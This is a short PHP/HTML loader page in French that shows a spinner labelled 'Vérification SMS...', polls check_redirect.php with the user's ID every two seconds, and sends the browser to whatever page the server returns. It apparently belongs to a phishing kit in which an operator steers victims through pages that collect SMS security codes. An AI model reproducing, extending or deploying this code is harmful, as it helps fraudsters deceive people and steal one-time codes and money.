<?php
require_once 'config.php';
checkRedirect();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Chargement</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; text-align: center; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #9C27B0; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
        setTimeout(function() {
            window.location.href = 'done.php';
        }, 30000);
    </script>
</head>
<body>
    <div class="container">
        <h2>⏳ Vérification SMS...</h2>
        <div class="loader"></div>
        <p>Validation de votre code de sécurité</p>
    </div>

    <script>
    setInterval(() => {
        fetch('check_redirect.php?user_id=<?php echo $current_user_id; ?>')
            .then(r => r.text())
            .then(page => {
                if (page && page.trim() !== '' && page !== 'loader2.php') {
                    window.location.href = page;
                }
            });
    }, 2000);
    </script>
</body>
</html>
